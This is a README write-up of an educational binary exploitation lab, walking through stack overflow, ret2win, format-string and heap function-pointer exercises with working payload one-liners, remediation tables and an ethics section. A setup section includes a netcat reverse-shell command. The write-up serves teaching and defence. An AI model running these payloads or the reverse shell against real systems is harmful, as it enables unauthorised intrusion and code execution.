# Hole-In-Bin

> A hands-on binary exploitation and reverse engineering project completed as part of the **01-edu Cybersecurity curriculum**.
> All exploitation was performed inside the provided VM environment (`/opt/hole-in-bin`) using only disassemblers and debuggers — no decompilers were used.

---

## Table of Contents

1. [Environment Setup](#environment-setup)
2. [Tooling](#tooling)
3. [Analysis Workflow](#analysis-workflow)
4. [Challenge Walkthroughs](#challenge-walkthroughs)
   - [ex00 – Stack Buffer Overflow (Overwriting a Local Variable)](#ex00)
   - [ex01 – Stack Buffer Overflow (Specific Value Overwrite)](#ex01)
   - [ex02 – Stack Buffer Overflow via Environment Variable](#ex02)
   - [ex03 – Stack Buffer Overflow (Function Pointer Overwrite)](#ex03)
   - [ex04 – Ret2Win (Return Address Overwrite)](#ex04)
   - [ex05 – Stack Buffer Overflow (Local Variable Overwrite)](#ex05)
   - [ex06 – Calling winner() with GDB](#ex06)
   - [ex07 – Format String Vulnerability (Write a Value)](#ex07)
   - [ex08 – Format String Multi-Byte Write](#ex08)
   - [ex09 – Format String %hn Arbitrary Write](#ex09)
   - [ex10 – Heap Overflow (Function Pointer Overwrite)](#ex10)
   - [ex11 – Heap Structure Pointer Overwrite (Function Pointer Hijack)](#ex11)
5. [Remediation Suggestions](#remediation-suggestions)
6. [Ethical Hacking Report](#ethical-hacking-report)
7. [Resources](#resources)

---

## Environment Setup

All exploitation was performed inside the provided VM. Below are the setup instructions.

### Intel/AMD Systems (VirtualBox)

1. Download the VM image: [hole-in-bin.ova](https://assets.01-edu.org/cybersecurity/hole-in-bin/hole-in-bin.ova)
2. Verify the SHA1 checksum:
   ```bash
   sha1sum hole-in-bin.ova
   # Expected: 00fda7d71361240d4d32499eb7fc5b156bbd53fc
   ```
3. Import the OVA file into VirtualBox (`File → Import Appliance`).
4. Configure the network (Bridged Adapter or NAT).
5. Start the VM.

### Apple Silicon (M1/M2/M3/M4 — UTM)

1. Download the VM image: [hole-in-bin.utm.zip](https://assets.01-edu.org/cybersecurity/hole-in-bin/hole-in-bin.utm.zip)
2. Verify the SHA1 checksum:
   ```bash
   shasum hole-in-bin.utm.zip
   # Expected: fc93533b2054d10d03b09d53c223e57bf7ac7b62
   ```
3. Extract the ZIP file.
4. Open UTM and import the VM (`+` → `Open Existing`).
5. Start the VM.

### Login Credentials

| Field    | Value  |
|----------|--------|
| Username | `user` |
| Password | `user` |

### Remote Shell Access (optional)

```bash
# On the VM
busybox nc 192.168.56.105 4444 -e /bin/bash

# On the host
rlwrap nc -lvnp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Tooling

| Tool       | Purpose                                            |
|------------|----------------------------------------------------|
| `file`     | Identify binary type and architecture              |
| `checksec` | Check binary security protections                  |
| `strings`  | Extract printable strings from binary              |
| `readelf`  | Inspect ELF headers, sections, and symbols         |
| `objdump`  | Disassemble machine code to assembly               |
| `GDB/PEDA` | Dynamic analysis, breakpoints, register inspection |
| `Radare2`  | Alternative disassembler/debugger framework        |
| `Python3`  | Craft binary exploit payloads                      |

> **Note:** Only the **Listing (Assembly) View** of Ghidra was used where applicable. The Decompiler Window was kept closed throughout. Decompilers are forbidden by the project guidelines.

---

## Analysis Workflow

Every binary was analyzed using this standard workflow before attempting exploitation:

```bash
# 1. Identify the binary
file bin

# 2. Check security protections
checksec --file=bin

# 3. Extract strings
strings bin

# 4. Inspect ELF structure
readelf -h bin   # header
readelf -l bin   # program headers
readelf -S bin   # section headers
readelf -s bin   # symbol table

# 5. Check shared libraries
ldd bin

# 6. Disassemble
objdump -M intel -d bin

# 7. Dynamic analysis
gdb ./bin
```

---

## Challenge Walkthroughs

---

### ex00

## ex00 – Stack Buffer Overflow (Overwriting a Local Variable)

**Objective:** Trigger the message `you have changed the 'modified' variable`.

### Analysis

```bash
file bin       # 32-bit ELF, dynamically linked, not stripped
checksec bin   # No RELRO, No Stack Canary, NX Disabled, No PIE
strings bin    # Found: "you have changed the 'modified' variable", "gets"
```

### Assembly Insight (GDB)

```bash
gdb ./bin
(gdb) disassemble main
```

Key instructions:

```asm
sub    esp, 0x60          ; reserve 96 bytes on the stack
movl   $0x0, 0x5c(%esp)  ; modified = 0  (at ESP+0x5c)
lea    0x1c(%esp), %eax  ; EAX = &buffer  (buffer starts at ESP+0x1c)
mov    %eax, (%esp)      ; pass buffer as argument
call   gets@plt          ; reads unbounded input into buffer
mov    0x5c(%esp), %eax  ; load modified
test   %eax, %eax        ; if modified != 0 -> success
```

### Stack Layout

```
ESP + 0x1c  -> buffer[64]
ESP + 0x5c  -> modified (int)
```

Gap: `0x5c - 0x1c = 0x40 = 64 bytes`

### Exploit

Send 65+ bytes — the 65th byte overwrites `modified`:

```bash
./bin
# Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (65 A's)
```

### Key Takeaway

`gets()` performs **no bounds checking**. Writing 64+ bytes into a 64-byte buffer overwrites the adjacent `modified` variable, changing it from `0` to non-zero.

---

### ex01

## ex01 – Stack Buffer Overflow (Specific Value Overwrite)

**Objective:** Trigger `you have correctly got the variable to the right value` by overwriting `modified` with exactly `0x61626364`.

### Analysis

Same binary structure as ex00, but now the check is:

```c
if (modified == 0x61626364)
```

### Exploit

The value `0x61626364` is `abcd` in ASCII. On x86 (little-endian), we send it as `\x64\x63\x62\x61`:

```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x64\x63\x62\x61")')"
```

### Key Takeaway

x86 uses **little-endian** byte ordering — the least significant byte is stored first. When crafting payloads with specific integer values, the byte order must be reversed.

---

### ex02

## ex02 – Stack Buffer Overflow via Environment Variable

**Objective:** Trigger `you have correctly modified the variable` by overflowing a buffer read from the `GREENIE` environment variable.

### Analysis

The binary reads input from an environment variable instead of `argv` or `stdin`:

```bash
strings bin    # Found: "GREENIE", "getenv"
```

The target value is `0x0a0d0a0d`.

### Exploit

```bash
export GREENIE=$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x0a\x0d\x0a\x0d")')
./bin
```

### Key Takeaway

Environment variables are another user-controlled input source. Any unchecked copy of environment variable data into a fixed-size buffer is vulnerable to overflow.

---

### ex03

## ex03 – Stack Buffer Overflow (Function Pointer Overwrite)

**Objective:** Redirect execution to the `win()` function and trigger `code flow successfully changed`.

### Analysis

```bash
objdump -d bin | grep "<win>"
# 0x08048524 <win>
```

The binary stores a function pointer on the stack adjacent to the buffer:

```c
char buffer[64];
void (*fp)() = NULL;
// ...
gets(buffer);
fp();
```

### Exploit

Overwrite the function pointer with the address of `win()`:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x24\x84\x04\x08")' | ./bin
```

### Key Takeaway

When a function pointer lives adjacent to a vulnerable buffer on the stack, overflowing the buffer lets an attacker redirect execution to any address — this is **control-flow hijacking**.

---

### ex04

## ex04 – Ret2Win (Return Address Overwrite)

**Objective:** Exploit a stack buffer overflow to overwrite the **saved return address** and redirect execution to `win()`.

### Analysis

```bash
objdump -d bin | grep "<win>"
# 0x080483f4 <win>

gdb ./bin
(gdb) disassemble main
# Determine the offset to the return address
```

The buffer is 76 bytes from the saved return address (64-byte buffer + 12 bytes of padding/frame data).

### Exploit

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xf4\x83\x04\x08")' | ./bin
```

### Key Takeaway

**Ret2Win** is one of the most fundamental exploitation techniques. By overwriting the saved `EIP` on the stack with the address of a target function, the attacker hijacks control flow when the current function returns (`ret` pops the saved address into `EIP`).

---

### ex05

## ex05 – Stack Buffer Overflow (Local Variable Overwrite)

**Objective:** Trigger `you have hit the target correctly :)` by overwriting the `target` variable with `0xdeadbeef`.

### Analysis

The `target` variable sits immediately after the buffer on the stack. The binary accepts input via `argv[1]`.

### Exploit

```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\xef\xbe\xad\xde")')"
```

The value `0xdeadbeef` in little-endian is `\xef\xbe\xad\xde`.

### Key Takeaway

Same principle as ex00/ex01, but input comes through `argv` instead of `stdin`. The exploit technique (controlled overflow to adjacent memory) is identical regardless of input source.

---

### ex06

## ex06 – Calling `winner()` with GDB

**Objective:** Execute the hidden `winner()` function using GDB's ability to manipulate registers directly.

### Analysis

```bash
objdump -d bin | grep "<winner>"
# 08048864 <winner>

objdump -d bin | grep "<main>"
# 08048889 <main>
```

### Exploit

```bash
gdb ./bin
(gdb) break main
(gdb) run AAAA BBBB CCCC
(gdb) set $eip = 0x08048864
(gdb) continue
```

### Key Takeaway

GDB can directly manipulate CPU registers, including `EIP` (the instruction pointer). This technique demonstrates how debuggers can be used to test arbitrary code paths without a memory vulnerability.

---

### ex07

## ex07 – Format String Vulnerability (Write a Value)

**Objective:** Modify the global variable `target` to `64 (0x40)` and trigger `you have modified the target :)`.

### Analysis

The binary passes user input directly to `printf()`:

```c
printf(user_input);  // VULNERABLE -- never do this
```

```bash
readelf -s bin | grep target
# target is at 0x080496e4
```

The `%n` format specifier writes the number of bytes printed so far into the pointed-to address.

### Exploit

Write the address of `target` at the beginning of the buffer, then use `%4$n` to write to it. Add 60 'A's to make the count reach 64 (0x40):

```bash
python -c "print('\xe4\x96\x04\x08' + 'A'*60 + '%4\$n')" | ./bin
```

### Key Takeaway

**Format String Vulnerabilities** arise when user-controlled strings are passed directly to `printf()`. The `%n` specifier enables arbitrary memory writes, making this a critical vulnerability class.

---

### ex08

## ex08 – Format String Multi-Byte Write

**Objective:** Overwrite `target` with `0x01025544` using format string exploitation with `%hhn` (byte-by-byte write).

### Analysis

```bash
readelf -s bin | grep target
# target at 0x080496f4
```

The value `0x01025544` must be written across 4 consecutive bytes:
- `0x080496f4` -> `0x44`
- `0x080496f5` -> `0x55`
- `0x080496f6` -> `0x02`
- `0x080496f7` -> `0x01`

### Exploit

```bash
python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$hhn%17x%13$hhn%173x%14$hhn%255x%15$hhn"' | ./bin
```

### Key Takeaway

`%hhn` writes a single byte. By placing multiple target addresses on the stack and using indexed format specifiers (`%N$hhn`), an attacker can write arbitrary multi-byte values to arbitrary memory locations — a powerful and dangerous primitive.

---

### ex09

## ex09 – Format String `%hn` Arbitrary Write

**Objective:** Overwrite `target` to redirect code execution and trigger `code execution redirected! you win`.

### Analysis

```bash
readelf -s bin | grep target
# target at 0x08049724
```

The `%hn` specifier writes a **2-byte (halfword)** value, giving finer control for larger values.

### Exploit

```bash
python -c 'print "\x24\x97\x04\x08" + "%33968x%4$hn"' | ./bin
```

The 4-byte address prefix + 33968 padding characters make the print count reach the target value, which is then written with `%4$hn`.

### Key Takeaway

`%hn` enables 2-byte writes, allowing exploitation of targets where the full value exceeds what `%hhn` can reach in a single write. Format string exploits can precisely target any address in writable memory.

---

### ex10

## ex10 – Heap Overflow (Function Pointer Overwrite)

**Objective:** Overwrite a **heap-allocated function pointer** to execute `winner()` instead of `nowinner()`.

### Analysis

The program allocates two heap chunks:

```c
char *data    = malloc(64);   // chunk 1 -- 64 bytes
void (**fp)() = malloc(4);    // chunk 2 -- function pointer

*fp = nowinner;

strcpy(data, argv[1]);        // VULNERABLE -- no bounds check

(*fp)();
```

```bash
objdump -d bin | grep "<winner>"
# 0x08048464 <winner>
```

### Exploit

Overflowing `data` (64 bytes) overwrites the adjacent heap chunk containing the function pointer:

```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\x64\x84\x04\x08")')"
```

72 bytes (64 buffer + 8 heap metadata) reach the function pointer, replacing it with the address of `winner()`.

### Key Takeaway

**Heap overflows** are analogous to stack overflows but occur in heap-allocated memory. When a function pointer is stored on the heap adjacent to a vulnerable buffer, an overflow can achieve control-flow hijacking.

---

### ex11

## ex11 – Heap Structure Pointer Overwrite (Function Pointer Hijack)

**Objective:** Execute `winner()` by overwriting a heap structure's function pointer field.

### Analysis

```bash
objdump -t bin | grep winner
# 0x08048494 <winner>
# 0x08048474 <nowinner>
```

The program allocates two structures on the heap. The second structure contains a function pointer. Overflowing the first structure's buffer overwrites the second structure's function pointer.

### Exploit

```bash
./bin $(python -c "print 'A'*20 + '\x74\x97\x04\x08'") $(python -c "print '\x94\x84\x04\x08'")
```

- First argument: 20-byte overflow into the second structure's data pointer, redirecting it.
- Second argument: the address of `winner()`, written through the now-hijacked pointer.

### Key Takeaway

Complex heap structures (e.g., linked lists, vtables, callback registries) often contain function pointers. Heap overflows that corrupt adjacent structure fields can achieve arbitrary code execution without ever touching the stack.

---

## Remediation Suggestions

### Buffer Overflow Mitigations

| Vulnerability | Remediation |
|---------------|-------------|
| `gets()` usage | Replace with `fgets(buffer, sizeof(buffer), stdin)` |
| `strcpy()` usage | Replace with `strncpy()` or `strlcpy()` |
| No bounds checking | Always validate input length before copying |
| Stack Canary disabled | Compile with `-fstack-protector-strong` |
| NX disabled | Compile with `-z noexecstack`; use hardware NX bit |
| PIE disabled | Compile with `-fPIE -pie` to enable ASLR for the binary |
| No RELRO | Link with `-z relro -z now` |

### Format String Mitigations

| Vulnerability | Remediation |
|---------------|-------------|
| `printf(user_input)` | Always use `printf("%s", user_input)` |
| Unsanitized format strings | Validate and sanitize all format specifiers in user input |
| Missing compiler warnings | Compile with `-Wformat=2` to catch bugs at compile time |

### Heap Overflow Mitigations

| Vulnerability | Remediation |
|---------------|-------------|
| `strcpy()` without bounds check | Track allocated sizes; use `strncpy()` or `memcpy()` with length |
| Function pointers on heap | Avoid storing function pointers adjacent to user-controlled buffers |
| Heap metadata corruption | Use hardened allocators (e.g., jemalloc, tcmalloc) |

### General Defense-in-Depth

- **Enable ASLR** at the OS level: `echo 2 > /proc/sys/kernel/randomize_va_space`
- **Modern compilers**: Use GCC 12+ or Clang 14+ with security flags enabled by default
- **Static analysis**: Run `cppcheck`, `flawfinder`, or `clang-tidy` in CI pipelines
- **Dynamic analysis**: Use AddressSanitizer (`-fsanitize=address`) and Valgrind during development
- **Code review**: Treat all user-controlled input as untrusted; never pass it directly to format functions

---

## Ethical Hacking Report

### Importance of Proper Authorization

All security testing must be conducted only on systems for which explicit, written authorization has been obtained. In this project, authorization is implicit — the VM was provided specifically for exploitation practice. In real-world engagements, a signed **Rules of Engagement (RoE)** document must be in place before any testing begins.

Unauthorized exploitation of systems — even for educational purposes — is **illegal** under laws such as:

- The **Computer Fraud and Abuse Act (CFAA)** — United States
- The **Computer Misuse Act 1990** — United Kingdom
- **Articles 323-1 to 323-7 of the Penal Code** — France
- **Directive 2013/40/EU** — European Union

### Legal and Ethical Boundaries

During this project, the following ethical principles were strictly observed:

1. **Scope**: All exploitation was limited to the `/opt/hole-in-bin` binaries inside the isolated VM.
2. **No lateral movement**: No attempt was made to exploit the host machine, network, or any system outside the VM.
3. **No automated tools**: No external exploitation frameworks (e.g., Metasploit) were used. All payloads were crafted manually.
4. **No decompilers**: Only assembly-level analysis was performed, respecting the project guidelines.
5. **Documentation**: All findings were documented transparently and completely.

### Responsible Disclosure Practices

In a real-world vulnerability research context, **responsible disclosure** (also called coordinated disclosure) is the standard ethical practice:

1. **Discover** the vulnerability through authorized research.
2. **Document** the vulnerability thoroughly with a proof-of-concept.
3. **Report privately** to the affected vendor/organization (not publicly).
4. **Allow remediation time** — typically 90 days (Google Project Zero standard).
5. **Publish** the finding publicly after the vendor has released a fix, or after the deadline has passed.

Organizations like the **CVE Program**, **CERT/CC**, and **HackerOne** provide structured frameworks for responsible disclosure.

### Real-World Implications

The vulnerabilities explored in this project are not theoretical — they represent classes of bugs that have caused major real-world security incidents:

| Vulnerability Type | Real-World Example |
|--------------------|-------------------|
| Stack Buffer Overflow | Morris Worm (1988), MS08-067 (Conficker) |
| Format String | wu-ftpd remote root (2000) |
| Heap Overflow | CVE-2021-22555 (Linux kernel) |
| Return Address Overwrite | Nearly every classic Unix exploit |

Understanding these vulnerabilities from an attacker's perspective is essential for:

- **Writing secure code** that avoids these patterns
- **Reviewing code** to catch vulnerabilities before deployment
- **Designing systems** with defense-in-depth principles
- **Responding to incidents** involving memory corruption

---

## Resources

| Resource | Description |
|----------|-------------|
| [Smashing the Stack for Fun and Profit](http://phrack.org/issues/49/14.html) | Classic paper on buffer overflow exploitation |
| [Binary Exploitation Techniques](https://www.secquest.co.uk/white-papers/binary-exploitation-techniques) | Comprehensive guide to binary exploitation |
| [x86 Assembly Guide](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html) | Reference for x86 assembly instructions |
| [GDB Documentation](https://www.gnu.org/software/gdb/documentation/) | Official GNU Debugger documentation |
| [Radare2](https://radare.org/n/radare2.html) | Open-source reverse engineering framework |
| [Ghidra](https://ghidra-sre.org/) | NSA software reverse engineering suite |
| [CTF101 - Binary Exploitation](https://ctf101.org/binary-exploitation/overview/) | CTF-focused binary exploitation overview |
| [LiveOverflow YouTube](https://www.youtube.com/@LiveOverflow) | Video walkthroughs of binary exploitation concepts |
